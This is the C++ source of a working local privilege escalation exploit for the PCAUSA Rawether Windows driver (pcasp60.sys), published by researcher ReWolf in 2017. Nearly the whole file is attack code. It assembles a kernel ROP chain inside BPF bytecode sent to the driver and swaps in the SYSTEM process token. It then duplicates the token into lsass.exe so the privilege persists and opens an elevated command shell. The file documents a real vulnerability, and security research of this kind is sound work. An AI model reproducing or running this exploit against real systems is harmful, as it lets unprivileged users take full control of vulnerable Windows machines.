/**
*
* PCAUSA Rawether for Windows local privilege escalation
*
* Copyright (c) 2017 ReWolf
* http://blog.rewolf.pl/
* http://blog.rewolf.pl/blog/?p=1778
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU Lesser General Public License as published
* by the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU Lesser General Public License for more details.
*
* You should have received a copy of the GNU Lesser General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/
#include <cstdio>
#include <Windows.h>
#include <string>
#include <cstdint>
#include <string>

#include "GoGoGadget.h"
#include "PcaSp60.h"
#include "Helpers.h"

void writeStack(std::vector<bpf_insn>& bytecode, int idx, uint64_t value)
{
	bytecode.emplace_back(bpf_insn(0, 0, 0, value & 0xFFFFFFFF));
	bytecode.emplace_back(bpf_insn(2, 0, 0, 0x12 + 2 * idx));
	bytecode.emplace_back(bpf_insn(0, 0, 0, (value >> 32) & 0xFFFFFFFF));
	bytecode.emplace_back(bpf_insn(2, 0, 0, 0x12 + 2 * idx + 1));
}

std::vector<bpf_insn> preparePayload()
{
	GoGoGadget gogo;
	gogo.addApi("ntoskrnl.exe", "PsLookupProcessByProcessId");
	gogo.addApi("ntoskrnl.exe", "PsGetCurrentProcess");
	gogo.addModule("pcasp60.sys");
	gogo.addGadget(GadgetType::PopR14);
	gogo.addGadget(GadgetType::PopRdx);
	gogo.addGadget(GadgetType::PopRcx);
	gogo.addGadget(GadgetType::PopRax);
	gogo.addGadget(GadgetType::AddRaxRcx);
	gogo.addGadget(GadgetType::MovRaxPtrRax);
	gogo.addGadget(GadgetType::MovRbxRax);
	gogo.addGadget(GadgetType::MovRcxRsiCallR14);
	gogo.addGadget(GadgetType::MovRcxRbxCallR14);
	gogo.addGadget(GadgetType::MovPtrRaxRcx);

	gogo.addGadget("MovPtrRcx38Eax", { 0x89, 0x41, 0x38, 0xc3 });
	gogo.addGadget("Pop4Times", { 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3 });

	gogo.go();

	uint32_t myPID = GetCurrentProcessId();	
	uint64_t pcaBase = gogo.getSymbol("pcasp60.sys");

	printf("Current PID  : %08X\n", myPID);
	printf("PcaSp60 base : %0I64X\n", pcaBase);

	int idx = 0;
	std::vector<bpf_insn> bytecode;

	// reset spinlock
	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopR14));
	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRdx));
	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRcxRsiCallR14));
	writeStack(bytecode, idx++, gogo.getSymbol("MovPtrRcx38Eax"));

	// get current process EPROCESS
	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRcx));
	writeStack(bytecode, idx++, myPID);
	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRdx));
	writeStack(bytecode, idx++, pcaBase + 0x7400);
	writeStack(bytecode, idx++, gogo.getSymbol("ntoskrnl.exe", "PsLookupProcessByProcessId"));
	writeStack(bytecode, idx++, gogo.getSymbol("Pop4Times"));
	writeStack(bytecode, idx++, 0);
	writeStack(bytecode, idx++, 0);
	writeStack(bytecode, idx++, 0);
	writeStack(bytecode, idx++, 0);

	// get NT AUTHORITY\SYSTEM EPROCESS
	writeStack(bytecode, idx++, gogo.getSymbol("ntoskrnl.exe", "PsGetCurrentProcess"));
	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRcx));
	writeStack(bytecode, idx++, 0x358);
	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::AddRaxRcx));
	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRaxPtrRax));

	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRbxRax));

	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRax));
	writeStack(bytecode, idx++, pcaBase + 0x7400);
	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRaxPtrRax));
	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::AddRaxRcx));

	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopR14));
	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRdx));
	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRcxRbxCallR14));
	writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovPtrRaxRcx));

	// pcaBase + 0x4C89	-> restore registers (without rbx, but it seems to be ok in this case)
	writeStack(bytecode, idx++, pcaBase + 0x4C89);

	bytecode.emplace_back(bpf_insn(6, 0, 0, 0));	// return 0, so rax = 0 at the begining of ROP execution
	return bytecode;
}

bool preserveElevatedToken()
{
	//https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf

	SmartHANDLE hSystemProcess(OpenProcess(PROCESS_DUP_HANDLE, FALSE, getProcessPid(L"lsass.exe")), &CloseHandle);
	if (NULL == hSystemProcess.get())
		return false;

	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE, &hToken))
		return false;
	SmartHANDLE hTokenSmart(hToken, &CloseHandle);

	HANDLE hTargetHandle1;
	HANDLE hTargetHandle2;
	if (!DuplicateHandle(GetCurrentProcess(), hToken, hSystemProcess.get(), &hTargetHandle1, 0, FALSE, DUPLICATE_SAME_ACCESS))
		return false;
	if (!DuplicateHandle(GetCurrentProcess(), hToken, hSystemProcess.get(), &hTargetHandle2, 0, FALSE, DUPLICATE_SAME_ACCESS))
		return false;
	return true;
}

DWORD WINAPI ReadThreadProc(LPVOID lpParameter)
{
	BYTE temp[0x60] = { 0 };
	Read((HANDLE)lpParameter, temp, sizeof(temp));
	return 0;
}

int main()
{
	std::string currentUser = whoami();
	std::vector<bpf_insn> bytecode = preparePayload();

	printf("Current user: %s\n", currentUser.c_str());

	ForEachNetworkAdapterStatus status = forEachNetworkAdapter([&](const std::wstring& adapter) -> bool
	{
		static const wchar_t PCADeviceName[] = L"\\\\.\\PCASp60";
		SmartHANDLE hDev(CreateFile(PCADeviceName, 0xC0000000, 0, 0, 3u, 0x80u, 0), &CloseHandle);
		if (INVALID_HANDLE_VALUE == hDev.get())
		{
			printf("Failed to open %ws device.\n", PCADeviceName);
			return 0;
		}
		//printf("PCASp60 device handle: %p\n", hDev);

		bool openAdp = OpenAdapter(hDev.get(), adapter);
		printf("Opening network adapter: %ws %d\n", adapter.c_str(), openAdp);

		MakeNdisRequest_OID_GEN_CURRENT_PACKET_FILTER(hDev.get(), 0x80);	// NDIS_PACKET_TYPE_ALL_LOCAL 
		SetBPFProgram(hDev.get(), bytecode.data(), (DWORD)bytecode.size() * sizeof(bpf_insn));

		CloseHandle(CreateThread(nullptr, 0, ReadThreadProc, (LPVOID)hDev.get(), 0, nullptr));

		std::string newUser;
		bool elevated = false;
		for (int i = 0; i < 4; i++)
		{
			Sleep(400);
			newUser = whoami();
			if (newUser != currentUser)
			{
				elevated = true;
				break;
			}
		}
		bool ret = false;
		if (elevated)
		{
			printf("elevated!\nCurrent user: %s\nPreserve token: %d", newUser.c_str(), preserveElevatedToken());
			ret = true;
		}
		CancelIoEx(hDev.get(), nullptr);
		return ret;
	});

	if (ForEachNetworkAdapterStatus::Success == status)
	{
		system("start cmd.exe /k whoami");
	}

	return 0;
}
